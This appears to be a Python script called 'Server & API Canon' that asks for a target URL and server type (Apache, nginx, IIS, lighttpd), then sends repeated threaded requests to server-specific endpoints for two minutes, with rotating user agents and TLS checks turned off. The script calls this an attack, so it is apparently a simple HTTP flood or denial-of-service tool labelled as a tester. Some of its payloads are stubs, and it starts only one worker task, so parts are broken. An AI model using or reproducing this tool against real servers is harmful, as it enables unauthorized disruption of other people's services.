import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ServerAPITester:
    def __init__(self, server_type):
        self.server_type = server_type.lower()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
        ]
        self.endpoints = self.get_endpoints()
        self.payload = self.get_payload()

    def get_endpoints(self):
        if self.server_type == "apache":
            return ["server-status", "cgi-bin/test.cgi"]
        elif self.server_type == "nginx":
            return ["/status", "/static/test.html"]
        elif self.server_type == "iis":
            return ["_vti_bin/shtml.dll", "aspnet_client/system_web/1_0_3705_0/web.config"]
        elif self.server_type == "lighttpd":
            return ["index.php", "fastcgi-test"]
        else:
            return []

    def get_payload(self):
        if self.server_type == "apache":
            return {"keep-alive": True}
        elif self.server_type == "nginx":
            return {"keep-alive": True}
        elif self.server_type == "iis":
            return """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" ...>"""
        elif self.server_type == "lighttpd":
            return b'\x01\x01\x00\x01\x00\x08\x00\x00'  # FastCGI payload
        else:
            return None

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def send_request(self, url, endpoint):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        headers = {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "*/*"
        }
        try:
            if isinstance(self.payload, dict):  # JSON or parameterized payload
                response = requests.get(full_url, headers=headers, params=self.payload, timeout=5, verify=False)
            elif isinstance(self.payload, bytes):  # Raw binary payload (e.g., FastCGI)
                response = requests.post(full_url, headers=headers, data=self.payload, timeout=5, verify=False)
            else:
                response = requests.get(full_url, headers=headers, timeout=5, verify=False)

            print(f"[{response.status_code}] {full_url}")
            return response.text
        except RequestException as e:
            print(f"[ERROR] {full_url}: {e}")
            return None

    def attack(self, url, duration=60, workers=10):
        start_time = time.time()

        def task():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                self.send_request(url, endpoint)

        with ThreadPoolExecutor(max_workers=workers) as executor:
            executor.submit(task)

def main():
    print("=== Server & API Canon ===")
    target_url = input("Masukan target URL (e.g., https://example.com): ").strip()
    server_type = input("Targetserver type (apache, nginx, iis, lighttpd): ").strip().lower()

    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return

    try:
        tester = ServerAPITester(server_type)
        tester.attack(target_url, duration=120, workers=20)  # Attack for 2 minutes
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
